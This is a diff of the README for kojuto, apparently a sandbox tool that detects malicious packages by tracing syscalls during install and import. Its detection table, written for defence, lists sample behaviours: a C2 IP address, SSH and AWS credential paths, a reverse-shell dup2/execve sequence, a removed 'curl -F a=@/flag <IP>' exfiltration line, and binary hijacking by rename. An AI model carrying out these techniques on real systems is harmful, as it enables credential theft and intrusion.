@@ -17,8 +17,8 @@ An EDR for package installations — monitors syscalls during install and import
 
 1. **Download** — Fetch the target package to the host (network allowed)
 2. **Isolate** — Run installation inside a hardened Docker container with network isolation
-3. **Install + Monitor** — Record `connect`, `sendto`, `sendmsg`, `sendmmsg`, `bind`, `listen`, `accept`, `execve`, `openat`, `rename`, `dup2`, `sendfile`, and `ptrace` syscalls via strace (or eBPF)
-4. **Import + Monitor** — Import/require the package under 3 simulated OS identities (Linux, Windows, macOS) with time shifted +30 days via `libfaketime` to trigger platform-gated and date-gated payloads
+3. **Install + Monitor** — Record `connect`, `sendto`, `sendmsg`, `sendmmsg`, `bind`, `listen`, `accept`, `execve`, `openat`, `rename`, `sendfile`, and `ptrace` syscalls via strace (or eBPF)
+4. **Import + Monitor** — Import/require the package under 3 simulated OS identities (Linux, Windows, macOS) with time shifted +30–180 days (randomized) via `libfaketime` to trigger platform-gated and date-gated payloads
 5. **Report** — Output findings as JSON
 
 The sandbox is intentionally seeded with realistic artifacts to provoke malicious behavior:
@@ -96,6 +96,7 @@ sudo ./scripts/setup-caps.sh ./kojuto
 | `--probe-method` | `auto` / `ebpf` / `strace` / `strace-container` (default: `auto`) |
 | `--timeout` | Scan timeout per package (default: `5m`) |
 | `--config` | Config file path (default: `kojuto.yml` in current directory) |
+| `--strict` | Ignore `sensitive_paths.exclude` from config (recommended for CI) |
 
 ### Exit Codes
 
@@ -221,7 +222,7 @@ kojuto does not rely solely on passive syscall observation. It actively creates 
 
 - **Honeypot credentials** — fake but realistic files and tokens that trigger harvesting logic
 - **CI environment signals** — environment variables that activate CI-gated payloads
-- **Time-shifted execution** — `libfaketime` advances the clock to trigger date-gated bombs
+- **Time-shifted execution** — `libfaketime` advances the clock by a random +30–180 day offset to trigger date-gated bombs
 - **Multi-OS identity** — simulated platform identities to defeat OS-gated payloads
 
 This approach detects environment-aware and delayed-execution supply chain attacks that would remain dormant in a sterile sandbox.
@@ -242,14 +243,14 @@ Of the 300 malicious samples, 238 failed to install (dependencies already remove
 
 | Category | Examples | Detection method |
 |----------|----------|-----------------|
-| C2 communication | `aiogram-types-v3` → `147.45.124.42:80`, `airio` → DNS exfil | `connect`/`sendto` to external IPs |
-| Credential theft | `axios-attack-demo` → `.ssh/id_rsa`, `.aws/credentials`, `.git-credentials` | `openat` on ~40 sensitive paths |
-| Reverse shell | `connect → dup2(fd, 0) → dup2(fd, 1) → execve /bin/sh` | `dup2` redirecting stdin/stdout |
-| Persistence | Write to `.bashrc`, `.zshrc`, `.profile`, `crontab` | `openat` with `O_WRONLY`/`O_RDWR` |
-| Data exfiltration | `a1rn` → `curl -F a=@/flag <IP>` | `execve` with `curl`/`wget` |
-| Code execution | `advpruebitaa` → `type nul > prueba11.txt`, `aio3` → `start python3` | `execve` with inline `-c`/`-e` flags |
-| Payload drop | `axios-attack-demo` → `python3 /tmp/ld.py` | `execve` of `/tmp` binaries |
-| Anti-debugging evasion | `ptrace(PTRACE_TRACEME)` to detect tracing | `ptrace` self-check returns `EPERM` under strace |
+| C2 communication (`c2_communication`) | `aiogram-types-v3` → `147.45.124.42:80` | `connect`/`sendto` to external IPs |
+| Credential access (`credential_access`) | `axios-attack-demo` → `.ssh/id_rsa`, `.aws/credentials` | `openat` on ~40 sensitive paths |
+| Code execution (`code_execution`) | `advpruebitaa` → `type nul > prueba11.txt`, `/tmp/ld.py` | `execve` with inline `-c`/`-e` flags or from `/tmp`, `/dev/shm` |
+| Binary hijacking (`binary_hijacking`) | `rename /tmp/evil /usr/local/bin/python3` | `rename` targeting trusted system binaries |
+| Backdoor (`backdoor`) | `bind` + `listen` + `accept` on attacker-controlled port | Server socket operations during install |
+| Persistence (`persistence`) | Write to `.bashrc`, `.zshrc`, `.profile`, `crontab` | `openat` with `O_WRONLY`/`O_RDWR` |
+| DNS tunneling (`dns_tunneling`) | `airio` → high-entropy subdomain queries, DoH connections | `sendto` port 53 with entropy > 3.5, `connect` to known DoH servers |
+| Evasion (`evasion`) | `ptrace(PTRACE_TRACEME)` to detect tracing | `ptrace` self-check returns `EPERM` under strace |
 
 ### Configuration
 
